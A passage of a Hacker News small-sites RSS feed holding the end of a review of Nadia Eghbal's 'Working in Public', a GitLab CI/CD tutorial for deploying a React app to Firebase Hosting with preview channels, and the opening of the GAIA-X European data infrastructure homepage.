<p><img src="https://veronneau.org/media/blog/2020-11-06/cover.jpg" width="70%" title="A picture of the book cover" alt="A picture of the book cover"></p>
<p>Contrary to what I was expecting, the book feels more like an extension of the
LCA keynote I previously mentioned than <em>Roads and Bridges</em>. Indeed, as made
apparent by the following quote, Eghbal doesn't believe funding to be the
primary problem of FOSS anymore:</p>
<blockquote>
<p><em>We still don't have a common understanding about </em>who's<em> doing the work,
</em>why<em> they do it, and </em>what<em> work needs to be done. Only when we understand
the underlying behavioral dynamics of open source today, and how it differs
from its early origins, can we figure out where money fits in. Otherwise,
we're just flinging wet paper towels at a brick wall, hoping that something
sticks.</em> — p.184</p>
</blockquote>
<p>That is to say, the behavior of maintainers and the challenges they face — not
the eternal money problem — is the real topic of this book. And it feels
refreshing. When was the last time you read something on the economics of Free
Software without it being mostly about what licences projects should pick and
how business models can be tacked on them? I certainly can't.</p>
<p>To be clear, I'm not sure I agree with Eghbal on this. Her having worked at
Github for a few years and having interviewed mostly people in the Ruby on
Rails and Javascript communities certainly shows in the form of a strong
selection bias. As she herself admits, this is a book on how software <em>on
Github</em> is produced. As much as this choice irks me (the Free Software
community certainly cannot be reduced to Github), this exercise had the merit
of forcing me to look at my own selection biases.</p>
<p>As such, reading <em>Working in Public</em> did to me something I wasn't expecting it
to do: it broke my Free Software echo chamber. Although I consider myself very
familiar with the world of Free and Open Source Software, I now understand my
somewhat ill-advised contempt for certain programming languages — mostly JS —
skewed my understanding of what FOSS in 2020 really is.</p>
<p>My Free Software world very much revolves around Debian, a project with a
strong and opinionated view of Free Software, rooted in a historical and
political understanding of the term. This, Eghbal argues, is not the case for a
large swat of developers anymore. They are <em>The Github Generation</em>, people
attached to Github as a platform first and foremost, and who feel "Open Source"
is just a convenient way to make things.</p>
<p>Although I could intellectualise this, before reading the book, I didn't really
<a href="https://en.wiktionary.org/wiki/grok">grok</a> how communities akin to npm have been reshaping the modern FOSS
ecosystem and how different they are from Debian itself. To be honest, I am not
sure I like this tangent and it is certainly part of the reason why I had a
tendency to dismiss it as a fringe movement I could safely ignore.</p>
<p>Thanks to Nadia Eghbal, I come out of this reading more humble and certainly
reminded that FOSS' heterogeneity is real and should not be idly dismissed.
This book is rich in content and although I could go on (my personal notes
clock-in at around 2000 words and I certainly disagree with a number of
things), I'll stop here for now. Go and grab a copy already!</p>

  </div></div>]]>
            </description>
            <link>https://veronneau.org/book-review-working-in-public-by-nadia-eghbal.html</link>
            <guid isPermaLink="false">hacker-news-small-sites-25012849</guid>
            <pubDate>Sat, 07 Nov 2020 02:32:26 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Gitlab CI Pipeline for React App on GCP Firebase with Preview Channel/Review App]]>
            </title>
            <description>
<![CDATA[
Score 2 | Comments 0 (<a href="https://news.ycombinator.com/item?id=25012845">thread link</a>) | @tmaier
<br/>
November 6, 2020 | https://tobiasmaier.info/posts/2020/11/07/gitlab-cicd-pipeline-react-on-gcp-firebase-hosting.html | <a href="https://web.archive.org/web/*/https://tobiasmaier.info/posts/2020/11/07/gitlab-cicd-pipeline-react-on-gcp-firebase-hosting.html">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>
  <div>
    <div>

      <p>This post explains how to setup and integrate GitLab <abbr title="Continuous Integration">CI</abbr> and Firebase Hosting in order to provide an efficient <abbr title="Continuous Integration">CI</abbr>/<abbr title="Continuous Deployment">CD</abbr> pipeline and also enable to preview and review Merge Requests when they are in the making.</p>

<hr>

<p>I wanted to deploy a React app.
My first choice would have been GitLab Pages for the sake of simplicity, but as it faces certain limitations relevant for Single Page Applications (<abbr title="Single Page Applications">SPAs</abbr>)<sup id="fnref:1" role="doc-noteref"><a href="#fn:1">1</a></sup>, I went for <a href="https://firebase.google.com/products/hosting"><abbr title="Google Cloud Platform">GCP</abbr> Firebase Hosting</a>.</p>

<p>Firebase Hosting has some nice features, which make it a nice choice to host web applications in general.
For starters, it includes a <abbr title="Content Delivery Network">CDN</abbr>, manages your <abbr title="Secure Sockets Layer">SSL</abbr> certificates and has a generous free tier.
But there is more: As hinted above, for a <abbr title="Single Page Application">SPA</abbr> it is important to rewrite all urls to <code>/index.html</code> in order to have the <abbr title="Single Page Application">SPA</abbr> Router take over and render the right page.</p>

<p>What I particularly like is the <a href="https://firebase.googleblog.com/2020/10/preview-channels-firebase-hosting.html">recently announced Preview Channel feature</a> of Firebase Hosting, which complements in my opinion perfectly <a href="https://about.gitlab.com/stages-devops-lifecycle/review-apps/">GitLabs’ Review Apps feature</a>.
Both features aim to deploy a change (Merge Request) to a preview or review environment before accepting a Merge Request.
This simplifies hands-on testing and improves the feedback loop within the development process.</p>

<p>This blog post will explain how to set up GitLab <abbr title="Continuous Integration">CI</abbr> to create a <abbr title="Continuous Integration">CI</abbr>/<abbr title="Continuous Deployment">CD</abbr> pipeline for the React App, which supports Preview Channels/Review Apps, continuously deploys to staging and production environments.</p>

<h2 id="create-the-basic-ci-pipeline">Create the basic <abbr title="Continuous Integration">CI</abbr> pipeline</h2>

<p>My <abbr title="Continuous Integration">CI</abbr> pipeline is pretty straight forward.
It essentially consists of <code>build</code>, <code>test</code> and <code>deploy</code> stages.
And additionally to this, an <code>install</code> stage.
The <code>install</code> stage takes care of installing packages and optimizes the caching the installed <code>node_modules</code> within the following jobs.</p>

<div><div><pre><code><span>stages</span><span>:</span>
  <span>-</span> <span>install</span>
  <span>-</span> <span>build</span>
  <span>-</span> <span>test</span>
  <span>-</span> <span>deploy</span>

<span>install</span><span>:</span>
  <span>stage</span><span>:</span> <span>install</span>
  <span>image</span><span>:</span> <span>node:14.9-alpine3.12</span>
  <span>script</span><span>:</span>
    <span>-</span> <span>npm install</span>
  <span>cache</span><span>:</span>
    <span>key</span><span>:</span>
      <span>files</span><span>:</span>
        <span>-</span> <span>package-lock.json</span>
    <span>paths</span><span>:</span>
      <span>-</span> <span>node_modules/</span>
</code></pre></div></div>

<p>The <code>build</code> job builds the application.</p>

<p>It uses the previously cached NPM packages (pull only, no override, see <code>cache</code> keys)</p>

<p>The artifact is what we will deploy later on.
It consists of the <code>build</code> directory and also carries over two Firebase Hosting related files (see <code>artifacts</code> key).
Carrying them over will save us in the <code>deploy</code> jobs from actually cloning this git repository, which in-turn will increase the speed of the pipeline.</p>

<p>We further improve speed by allowing the jobs of the build and test stages to run in parallel by enabling the Directed Acyclic Graph (DAG)<sup id="fnref:2" role="doc-noteref"><a href="#fn:2">2</a></sup>
(see <code>needs</code> key)</p>

<div><div><pre><code><span>build</span><span>:</span>
  <span>stage</span><span>:</span> <span>build</span>
  <span>image</span><span>:</span> <span>node:14.9-alpine3.12</span>
  <span>script</span><span>:</span>
    <span>-</span> <span>npm run build</span>
  <span>needs</span><span>:</span> <span>[</span><span>"</span><span>install"</span><span>]</span>
  <span>cache</span><span>:</span>
    <span>key</span><span>:</span>
      <span>files</span><span>:</span>
        <span>-</span> <span>package-lock.json</span>
    <span>policy</span><span>:</span> <span>pull</span>
    <span>paths</span><span>:</span>
      <span>-</span> <span>node_modules/</span>
  <span>artifacts</span><span>:</span>
    <span>expire_in</span><span>:</span> <span>1 week</span>
    <span>paths</span><span>:</span>
      <span>-</span> <span>.firebaserc</span>
      <span>-</span> <span>build</span>
      <span>-</span> <span>firebase.json</span>
</code></pre></div></div>

<p>The <code>test</code> stage consists of a lint job as well as a classic test job.</p>

<div><div><pre><code><span>lint</span><span>:</span>
  <span>stage</span><span>:</span> <span>test</span>
  <span>image</span><span>:</span> <span>node:14.9-alpine3.12</span>
  <span>needs</span><span>:</span> <span>[</span><span>"</span><span>install"</span><span>]</span>
  <span>cache</span><span>:</span>
    <span>key</span><span>:</span>
      <span>files</span><span>:</span>
        <span>-</span> <span>package-lock.json</span>
    <span>policy</span><span>:</span> <span>pull</span>
    <span>paths</span><span>:</span>
      <span>-</span> <span>node_modules/</span>
  <span>script</span><span>:</span>
    <span>-</span> <span>npm run lint</span>

<span>test</span><span>:</span>
  <span>stage</span><span>:</span> <span>test</span>
  <span>image</span><span>:</span> <span>node:14.9-alpine3.12</span>
  <span>needs</span><span>:</span> <span>[</span><span>"</span><span>install"</span><span>]</span>
  <span>cache</span><span>:</span>
    <span>key</span><span>:</span>
      <span>files</span><span>:</span>
        <span>-</span> <span>package-lock.json</span>
    <span>policy</span><span>:</span> <span>pull</span>
    <span>paths</span><span>:</span>
      <span>-</span> <span>node_modules/</span>
  <span>script</span><span>:</span>
    <span>-</span> <span>npm run test</span>
</code></pre></div></div>

<h2 id="setup-gcp-firebase-hosting">Setup <abbr title="Google Cloud Platform">GCP</abbr> Firebase Hosting</h2>

<p>A detailed guide on how to create a Firebase Hosting project for an <abbr title="Single Page Application">SPA</abbr> is out of scope for this article.
I believe the official <a href="https://firebase.google.com/docs/hosting/quickstart">get started guide</a> will bring you quite far.</p>

<p>I just want to mention some general assumptions on the cloud design, which are also relevant for the upcoming sections:</p>

<p>We have two <abbr title="Google Cloud Platform">GCP</abbr> projects:</p>

<ul>
  <li>One project for the staging environment, which also includes the preview/review environment</li>
  <li>One project for the production environment</li>
</ul>

<p>We do this to provide proper isolation of the production environment from all other environments.
This avoids that the production environment would ever be hit, if we would accidentally reach any quota limit within the staging environment and it simplifies access control to the cloud resources, when necessary.</p>

<p>In order to be able to deploy to any environment, we need to provide access credentials to GitLab <abbr title="Continuous Integration">CI</abbr>.
There are two ways available: Create a <abbr title="Google Cloud Platform">GCP</abbr> Service Account or generate a Firebase Access Token.
I went with the former for the sake of simplicity.
However, I consider Service Accounts for each <abbr title="Google Cloud Platform">GCP</abbr> project to be a safer solution.</p>

<p>Create the Firebase Access Token using <code>$ firebase login:ci</code>.</p>

<p>Go to your GitLab Project <code>Settings</code> → <code>CI / CD</code> → <code>Section "Variables"</code>
and create a new Variable called <code>FIREBASE_TOKEN</code> and store the Access Token there.</p>

<figure>
  <img src="https://tobiasmaier.info/images/2020-11-07-gitlab-cicd-pipeline-react-on-gcp-firebase-hosting/gitlab-ci-cd-variables.png" alt="Screenshot of the Section &quot;Variables&quot; within GitLab CI / CD Settings">
  <figcaption>Screenshot of the Section "Variables" within GitLab <abbr title="Continuous Integration">CI</abbr> / <abbr title="Continuous Deployment">CD</abbr> Settings</figcaption>
</figure>

<h2 id="deploy-to-staging-and-production-environments">Deploy to Staging and Production environments</h2>

<p>The <code>deploy</code> jobs deploy the application to the staging and production environment.</p>

<p>We follow the GitHub flow-based branching strategy.
We assume that there is a master branch, wich will be automatically deployed to the staging environment and then in a manual action to production.
Changes will be proposed with Merge Requests. which we discuss in the next section in detail.</p>

<p>GitLab provides support for environment and deployments.<sup id="fnref:3" role="doc-noteref"><a href="#fn:3">3</a></sup>
This feature allows to trigger the deployment from staging to production, but also supports to roll-back to a previous release, if ever necessary.</p>

<figure>
  <img src="https://tobiasmaier.info/images/2020-11-07-gitlab-cicd-pipeline-react-on-gcp-firebase-hosting/gitlab-environments.png" alt="Screenshot of GitLab Environments showing the &quot;Deploy to&quot;-button">
  <figcaption>Screenshot of GitLab Environments showing the "Deploy to"-button</figcaption>
</figure>

<p>To track deployments, I set the <code>environment</code> key, where the URL of this environment is dynamically derived from Firebase (see <code>script</code>, <code>environment</code> and <code>artifacts</code> keys).
<code>$ echo "ENVIRONMENT_URL=$(firebase hosting:channel:open live --non-interactive | awk '{ print $3 }')" &gt;&gt; deploy.env</code> does this.
As you can see, this is not trivial.
I don’t know if this would have been possible at all before <abbr title="Google Cloud Platform">GCP</abbr> introduced the Preview Channel feature, which we discuss below in more detail.
And with it, it also requires some <code>awk</code> magic to get the required string.</p>

<p>The job uses the <a href="https://firebase.google.com/docs/cli">firebase <abbr title="Command Line Interface">CLI</abbr></a> to deploy the <abbr title="Single Page Application">SPA</abbr>.
It uses the job artifacts of the <code>build</code> job and thus, does not need to clone the git repository.</p>

<div><div><pre><code><span>deploy:staging:</span>
  <span>image</span><span>:</span> <span>andreysenov/firebase-tools:latest</span>
  <span>stage</span><span>:</span> <span>deploy</span>
  <span>before_script</span><span>:</span>
    <span>-</span> <span>firebase use $ENVIRONMENT</span>
  <span>script</span><span>:</span>
    <span>-</span> <span>firebase deploy</span>
        <span>--token $FIREBASE_TOKEN</span>
        <span>--message "Pipeline $CI_PIPELINE_ID, build $CI_BUILD_ID"</span>
        <span>--non-interactive</span>
        <span>--only hosting</span>
    <span>-</span> <span>echo "ENVIRONMENT_URL=$(firebase hosting:channel:open live --non-interactive | awk '{ print $3 }')" &gt;&gt; deploy.env</span>
  <span>environment</span><span>:</span>
    <span>name</span><span>:</span> <span>staging</span>
    <span>url</span><span>:</span> <span>$ENVIRONMENT_URL</span>
  <span>artifacts</span><span>:</span>
    <span>reports</span><span>:</span>
      <span>dotenv</span><span>:</span> <span>deploy.env</span>
  <span>dependencies</span><span>:</span>
    <span>-</span> <span>build</span>
  <span>variables</span><span>:</span>
    <span>GIT_STRATEGY</span><span>:</span> <span>none</span>
    <span>ENVIRONMENT</span><span>:</span> <span>staging</span>
  <span>only</span><span>:</span>
    <span>-</span> <span>master</span>

<span>deploy:production:</span>
  <span>extends</span><span>:</span> <span>deploy:staging</span>
  <span>environment</span><span>:</span>
    <span>name</span><span>:</span> <span>production</span>
  <span>variables</span><span>:</span>
    <span>ENVIRONMENT</span><span>:</span> <span>production</span>
  <span>when</span><span>:</span> <span>manual</span>
</code></pre></div></div>

<h2 id="deploy-review-app-with-firebase-preview-channel">Deploy Review App with Firebase Preview Channel</h2>

<p>I always recommend to open Merge Requests as draft as early as possible.
This will be particularly useful for the preview and review feature, which I want to enable here.</p>

<p>The intended workflow is as follows:
A developer takes an Issue/Story, creates the branch and immediately the merge request.
The merge request is marked as <code>draft</code>, which allows to make upcoming changes visible as early as possible, but which disables the capability to merge it just yet.
A co-worker (e.g. a <abbr title="Product Owner">PO</abbr>, a tester, an architect) can see the Merge Request, discuss and review the code - and thanks to the Review App feature, he or she can also see the running application.</p>

<figure>
  <img src="https://tobiasmaier.info/images/2020-11-07-gitlab-cicd-pipeline-react-on-gcp-firebase-hosting/gitlab-merge-request-review-app.png" alt="Screenshot of a Merge Request with the &quot;View App&quot; button">
  <figcaption>Screenshot of a Merge Request with the "View App" button</figcaption>
</figure>

<p>Each new deployment to a preview channel will generate a new URL dynamically, similar to the deploy job discussed above.
What is different is the <code>$ firebase hosting:channel</code> command, which deploys the application to the Preview Channel and provides the URL.</p>

<p>GitLab would also provide the capability to destroy a Review App deployed, e.g. when the Merge Request has been merged or closed.
This is not necessary for Firebase Hosting, as the Preview Channel will be closed after a few days (max. 30 days)<sup id="fnref:4" role="doc-noteref"><a href="#fn:4">4</a></sup>.</p>

<div><div><pre><code><span>deploy:review:</span>
  <span>image</span><span>:</span> <span>andreysenov/firebase-tools:latest</span>
  <span>stage</span><span>:</span> <span>deploy</span>
  <span>before_script</span><span>:</span>
    <span>-</span> <span>firebase use $ENVIRONMENT</span>
  <span>script</span><span>:</span>
    <span>-</span> <span>firebase hosting:channel:deploy $CI_ENVIRONMENT_SLUG</span>
    <span>-</span> <span>echo "ENVIRONMENT_URL=$(firebase hosting:channel:open $CI_ENVIRONMENT_SLUG --non-interactive | awk '{ print $3 }')" &gt;&gt; deploy.env</span>
  <span>environment</span><span>:</span>
    <span>name</span><span>:</span> <span>review/$CI_COMMIT_REF_NAME</span>
    <span>url</span><span>:</span> <span>$ENVIRONMENT_URL</span>
  <span>artifacts</span><span>:</span>
    <span>reports</span><span>:</span>
      <span>dotenv</span><span>:</span> <span>deploy.env</span>
  <span>dependencies</span><span>:</span>
    <span>-</span> <span>build</span>
  <span>variables</span><span>:</span>
    <span>GIT_STRATEGY</span><span>:</span> <span>none</span>
    <span>ENVIRONMENT</span><span>:</span> <span>staging</span>
  <span>only</span><span>:</span>
    <span>-</span> <span>branches</span>
  <span>except</span><span>:</span>
    <span>-</span> <span>master</span>
</code></pre></div></div>

<h2 id="summary">Summary</h2>

<p>I created a GitLab <abbr title="Continuous Integration">CI</abbr>/<abbr title="Continuous Deployment">CD</abbr> pipeline for Firebase Hosting, which is also enables the Review App capability of GitLab.</p>

<p>Firebase Hosting proved to be a simple solution in the context.
What was non-trivial was to actually get the URLs of the environments.
I don’t know if this would have been possible at all before <abbr title="Google Cloud Platform">GCP</abbr> introduced the Preview Channel feature.
And with it, it also requires some <code>awk</code> magic to get the required string.</p>

<h2 id="complete-gitlab-ciyml-for-reference">Complete <code>.gitlab-ci.yml</code> for reference</h2>

<div><div><pre><code><span>stages</span><span>:</span>
  <span>-</span> <span>install</span>
  <span>-</span> <span>build</span>
  <span>-</span> <span>test</span>
  <span>-</span> <span>deploy</span>

<span>install</span><span>:</span>
  <span>stage</span><span>:</span> <span>install</span>
  <span>image</span><span>:</span> <span>node:14.9-alpine3.12</span>
  <span>script</span><span>:</span>
    <span>-</span> <span>npm install</span>
  <span>cache</span><span>:</span>
    <span>key</span><span>:</span>
      <span>files</span><span>:</span>
        <span>-</span> <span>package-lock.json</span>
    <span>paths</span><span>:</span>
      <span>-</span> <span>node_modules/</span>

<span>build</span><span>:</span>
  <span>stage</span><span>:</span> <span>build</span>
  <span>image</span><span>:</span> <span>node:14.9-alpine3.12</span>
  <span>script</span><span>:</span>
    <span>-</span> <span>npm run build</span>
  <span>needs</span><span>:</span> <span>[</span><span>"</span><span>install"</span><span>]</span>
  <span>cache</span><span>:</span>
    <span>key</span><span>:</span>
      <span>files</span><span>:</span>
        <span>-</span> <span>package-lock.json</span>
    <span>policy</span><span>:</span> <span>pull</span>
    <span>paths</span><span>:</span>
      <span>-</span> <span>node_modules/</span>
  <span>artifacts</span><span>:</span>
    <span>expire_in</span><span>:</span> <span>1 week</span>
    <span>paths</span><span>:</span>
      <span>-</span> <span>.firebaserc</span>
      <span>-</span> <span>build</span>
      <span>-</span> <span>firebase.json</span>

<span>lint</span><span>:</span>
  <span>stage</span><span>:</span> <span>test</span>
  <span>image</span><span>:</span> <span>node:14.9-alpine3.12</span>
  <span>needs</span><span>:</span> <span>[</span><span>"</span><span>install"</span><span>]</span>
  <span>cache</span><span>:</span>
    <span>key</span><span>:</span>
      <span>files</span><span>:</span>
        <span>-</span> <span>package-lock.json</span>
    <span>policy</span><span>:</span> <span>pull</span>
    <span>paths</span><span>:</span>
      <span>-</span> <span>node_mo…</span></code></pre></div></div></div></div></div></div>
<br/><p><em>Article truncated for RSS feed. Read the full article at <a href="https://tobiasmaier.info/posts/2020/11/07/gitlab-cicd-pipeline-react-on-gcp-firebase-hosting.html">https://tobiasmaier.info/posts/2020/11/07/gitlab-cicd-pipeline-react-on-gcp-firebase-hosting.html</a></em></p>]]>
            </description>
            <link>https://tobiasmaier.info/posts/2020/11/07/gitlab-cicd-pipeline-react-on-gcp-firebase-hosting.html</link>
            <guid isPermaLink="false">hacker-news-small-sites-25012845</guid>
            <pubDate>Sat, 07 Nov 2020 02:31:15 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Show HN: Personal OKR Template Built in Notion]]>
            </title>
            <description>
<![CDATA[
Score 10 | Comments 3 (<a href="https://news.ycombinator.com/item?id=25012687">thread link</a>) | @gogo61
<br/>
November 6, 2020 | https://rohitgupta.site/OKR-2021-f4c8acc86da24b278048b02158eafc32 | <a href="https://web.archive.org/web/*/https://rohitgupta.site/OKR-2021-f4c8acc86da24b278048b02158eafc32">archive.org</a>
<br/><!-- hnss:readable-content --><hr/>Unable to extract article]]>
            </description>
            <link>https://rohitgupta.site/OKR-2021-f4c8acc86da24b278048b02158eafc32</link>
            <guid isPermaLink="false">hacker-news-small-sites-25012687</guid>
            <pubDate>Sat, 07 Nov 2020 01:47:40 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Gaia-X: A Federated Data Infrastructure for Europe]]>
            </title>
            <description>
<![CDATA[
Score 4 | Comments 1 (<a href="https://news.ycombinator.com/item?id=25012624">thread link</a>) | @simonebrunozzi
<br/>
November 6, 2020 | https://www.data-infrastructure.eu/GAIAX/Navigation/EN/Home/home.html | <a href="https://web.archive.org/web/*/https://www.data-infrastructure.eu/GAIAX/Navigation/EN/Home/home.html">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div id="main"> <div role="listbox" data-slider-speed="1000"> <div> <figure> <picture> <source media="(max-width: 480px)" srcset="https://www.data-infrastructure.eu/GAIAX/Redaktion/EN/Bilder/buehnenbild.jpg?__blob=normal&amp;v=5&amp;size=530w"> <source media="(max-width: 767px)" srcset="https://www.data-infrastructure.eu/GAIAX/Redaktion/EN/Bilder/buehnenbild.jpg?__blob=normal&amp;v=5&amp;size=768w"> <source media="(max-width: 1039px)" srcset="https://www.data-infrastructure.eu/GAIAX/Redaktion/EN/Bilder/buehnenbild.jpg?__blob=normal&amp;v=5&amp;size=1024w"> <source media="(max-width: 1311px)" srcset="https://www.data-infrastructure.eu/GAIAX/Redaktion/EN/Bilder/buehnenbild.jpg?__blob=normal&amp;v=5&amp;size=1260w"> <source media="(min-width: 1312px)" srcset="https://www.data-infrastructure.eu/GAIAX/Redaktion/EN/Bilder/buehnenbild.jpg?__blob=normal&amp;v=5&amp;size=1900w"> <img src="https://www.data-infrastructure.eu/GAIAX/Redaktion/EN/Bilder/buehnenbild.jpg?__blob=normal&amp;v=5&amp;size=1900w" title="Project GAIA-X" alt="Project GAIA-X"> </picture> <figcaption> </figcaption> </figure> <div> <p> <h2>GAIA-X: A Federated Data Infrastructure for Europe </h2> </p> </div> </div> </div>  <nav>   </nav> <div> <div> <div> <div> <figure>  <p><img src="https://www.data-infrastructure.eu/GAIAX/Redaktion/EN/Bilder/20200901-gaia-x-en.jpg?__blob=normal&amp;v=1" title="Screenshot ..." alt="Screenshot ..."> </p> <figcaption> <p> <span> </span> <strong>GAIA-X: Driver of digital innovation in Europe</strong><br> </p> </figcaption> </figure> <p><strong>With GAIA-X, representatives from politics, business and science from France and Germany, together with other European partners, create a proposal for the next generation of a data infrastructure for Europe: a secure, federated system that meets the highest standards of digital sovereignty while promoting innovation. This project is the cradle of an open, transparent digital ecosystem, where data and services can be made available, collated and shared in an environment of trust</strong></p> <p>GAIA-X is a project initiated by Europe for Europe. Its aim is to develop common requirements for a European data infrastructure. Therefore openness, transparency and the ability to connect to other European countries are central to GAIA-X. Representatives from seven European countries are currently involved in the project. We want to invite other European partners to join the project and to contribute to its development. Many dialogues are already underway and will be further intensified. Furthermore, GAIA-X is in continuous exchange with the European Commission.</p> <p>Europe makes extensive investments in digital technologies and innovative business models. We must ensure that those who drive innovations forward are also those who benefit in economic terms. This will help to secure value creation and employment in Europe.<br> An open digital ecosystem is needed to enable European companies and business models to compete globally. This ecosystem should allow both the digital sovereignty of cloud services users and the scalability of European cloud providers.</p> <p>Within the GAIA-X project, we are developing the foundations for a federated, open data infrastructure based on European values. ‘Project GAIA-X’ connects centralised and decentralised infrastructures in order to turn them into a homogeneous, user-friendly system. The resulting federated form of data infrastructure strengthens the ability to both access and share data securely and confidently.</p> </div> </div>  </div> </div> <div id="id2112282" role="listbox" data-slider-speed="5000" data-slider-speed-auto="4000"> <div> <div> <figure> <picture> <source media="(max-width: 480px)" srcset="https://www.data-infrastructure.eu/GAIAX/Redaktion/EN/Bilder/gaia-x-summit-2020.jpg?__blob=normal&amp;v=2&amp;size=530w"> <source media="(max-width: 767px)" srcset="https://www.data-infrastructure.eu/GAIAX/Redaktion/EN/Bilder/gaia-x-summit-2020.jpg?__blob=normal&amp;v=2&amp;size=768w"> <source media="(max-width: 1039px)" srcset="https://www.data-infrastructure.eu/GAIAX/Redaktion/EN/Bilder/gaia-x-summit-2020.jpg?__blob=normal&amp;v=2&amp;size=1024w"> <source media="(max-width: 1311px)" srcset="https://www.data-infrastructure.eu/GAIAX/Redaktion/EN/Bilder/gaia-x-summit-2020.jpg?__blob=normal&amp;v=2&amp;size=1260w"> <source media="(min-width: 1312px)" srcset="https://www.data-infrastructure.eu/GAIAX/Redaktion/EN/Bilder/gaia-x-summit-2020.jpg?__blob=normal&amp;v=2&amp;size=1900w"> <img src="https://www.data-infrastructure.eu/GAIAX/Redaktion/EN/Bilder/gaia-x-summit-2020.jpg?__blob=normal&amp;v=2&amp;size=1900w" title="Gaia-X" alt="Gaia-X"> </picture> <figcaption> <p> © ... </p> </figcaption> </figure>  </div>  </div> </div> <div id="id1839162" tabindex="-1"> <div> <div> <p> <span>We invite you to participate in GAIA-X</span> </p> <h2> Together for a European Data Infrastructure </h2> </div>  </div> <div> <div> <div> <p>We are banking on Europe’s enduring strengths. Among others, these include the diversity of offerings, together with strong decentralised structures suitable to small and medium-sized enterprises. In this way, we link up the many investments in digital technologies made throughout Europe, enabling them to unfold an even greater effect.</p> <h3>Open for further participation</h3> <p>GAIA-X is defined by openness and transparency. The openness to national and European initiatives with similar objectives as GAIA-X gives the project a strong momentum for joint European cooperation. Building upon existing solutions and their further development, we want to launch competitive offers from Europe out onto the world market.</p> <p>More than 300 organizations from various countries are already involved in GAIA-X. Still, the project is open to new European interested parties to join us in its development. Participation in the project is also possible for market participants outside Europe who share our goals of data sovereignty and data availability.</p> <p>We welcome all interested parties who want to contribute their domain-specific and technical requirements and who want to actively participate: Both by contributing technical expertise, by submitting new use cases and by an active and continuous participation in a working group. Please indicate your interest by sending an e-mail to <a href="mailto:contact@data-infrastructure.eu" target="_blank" rel="noopener noreferrer" title="Opens a new window."><span>contact@data-infrastructure.eu</span></a>.</p> </div> </div> </div> </div> <div id="id2166226" tabindex="-1"> <div> <div> <p> <span>Building a solid structure for GAIA-X</span> </p> <h2> The GAIA-X Association </h2> </div>  </div> <div> <div> <div> <p>22 companies and organisations (11 from Germany and 11 from France) are currently establishing an international non-profit association (French: <span lang="fr" xml:lang="fr">association internationale sans but lucratif</span>, in short: AISBL) under Belgian law, the GAIA-X <abbr title="association internationale sans but lucratif">AISBL</abbr>. The association’s purpose and objective will be to consolidate and facilitate work and collaboration within the GAIA-X community – which is consisting of companies and organisations that actively participate in the development of GAIA-X. GAIA-X <abbr title="association internationale sans but lucratif">AISBL</abbr> will be representing its members and promoting international cooperation. To this end, the association will develop regulatory frameworks, and ensure that necessary services are made available. </p> <p>The founding members have signed the notarial founding documents in September 2020. As soon as the GAIA-X <abbr title="association internationale sans but lucratif">AISBL</abbr> is legally established, further members will be admitted, especially from other European member states. Meanwhile, the founding members will continue to prepare and develop the association’s headquarters in Brussels and its key organisational structures. If you are interested in becoming a member of the association, please send an e-mail to <a href="mailto:aisbl@data-infrastructure.eu" target="_blank" rel="noopener noreferrer" title="Opens a new window."><span>aisbl@data-infrastructure.eu</span></a>.</p> </div> </div> </div> </div> <div id="id1840934"> <h2> Statements by some GAIA-X founding members </h2> <div data-slider-items="3|2|1"> <div> <figure> <a title="title-text" data-toggle="lightbox" data-fancybox-group="gallery1840934" href="https://www.data-infrastructure.eu/GAIAX/Redaktion/EN/Bildergalerie/GAIA-X-Zitate/zitat-01.jpg?__blob=poster&amp;v=3&amp;size=1170w"> <picture> <source media="(max-width: 480px)" srcset="https://www.data-infrastructure.eu/GAIAX/Redaktion/EN/Bildergalerie/GAIA-X-Zitate/zitat-01.jpg?__blob=normal&amp;v=3&amp;size=210w"> <source media="(max-width: 767px)" srcset="https://www.data-infrastructure.eu/GAIAX/Redaktion/EN/Bildergalerie/GAIA-X-Zitate/zitat-01.jpg?__blob=normal&amp;v=3&amp;size=270w"> <source media="(min-width: 768px)" srcset="https://www.data-infrastructure.eu/GAIAX/Redaktion/EN/Bildergalerie/GAIA-X-Zitate/zitat-01.jpg?__blob=normal&amp;v=3&amp;size=420w"> <img src="https://www.data-infrastructure.eu/GAIAX/Redaktion/EN/Bildergalerie/GAIA-X-Zitate/zitat-01.jpg?__blob=normal&amp;v=3&amp;size=480w" title="Denis Lacroix, Senior Vice President of Amadeus IT Group" alt="Denis Lacroix, Senior Vice President of Amadeus IT Group"> </picture> </a> <figcaption> <p> © Amadeus IT Group </p> </figcaption> </figure> </div> <div> <figure> <a title="title-text" data-toggle="lightbox" data-fancybox-group="gallery1840934" href="https://www.data-infrastructure.eu/GAIAX/Redaktion/EN/Bildergalerie/GAIA-X-Zitate/zitat-02.jpg?__blob=poster&amp;v=4&amp;size=1170w"> <picture> <source media="(max-width: 480px)" srcset="https://www.data-infrastructure.eu/GAIAX/Redaktion/EN/Bildergalerie/GAIA-X-Zitate/zitat-02.jpg?__blob=normal&amp;v=4&amp;size=210w"> <source media="(max-width: 767px)" srcset="https://www.data-infrastructure.eu/GAIAX/Redaktion/EN/Bildergalerie/GAIA-X-Zitate/zitat-02.jpg?__blob=normal&amp;v=4&amp;size=270w"> <source media="(min-width: 768px)" srcset="https://www.data-infrastructure.eu/GAIAX/Redaktion/EN/Bildergalerie/GAIA-X-Zitate/zitat-02.jpg?__blob=normal&amp;v=4&amp;size=420w"> <img src="https://www.data-infrastructure.eu/GAIAX/Redaktion/EN/Bildergalerie/GAIA-X-Zitate/zitat-02.jpg?__blob=normal&amp;v=4&amp;size=480w" title="Elie Girard, CEO Atos SE" alt="Elie Girard, CEO Atos SE"> </picture> </a> <figcaption> <p> © Atos SE </p> </figcaption> </figure> </div> <div> <figure> <a title="title-text" data-toggle="lightbox" data-fancybox-group="gallery1840934" href="https://www.data-infrastructure.eu/GAIAX/Redaktion/EN/Bildergalerie/GAIA-X-Zitate/zitat-03.jpg?__blob=poster&amp;v=3&amp;size=1170w"> <picture> <source media="(max-width: 480px)" srcset="https://www.data-infrastructure.eu/GAIAX/Redaktion/EN/Bildergalerie/GAIA-X-Zitate/zitat-03.jpg?__blob=normal&amp;v=3&amp;size=210w"> <source media="(max-width: 767px)" 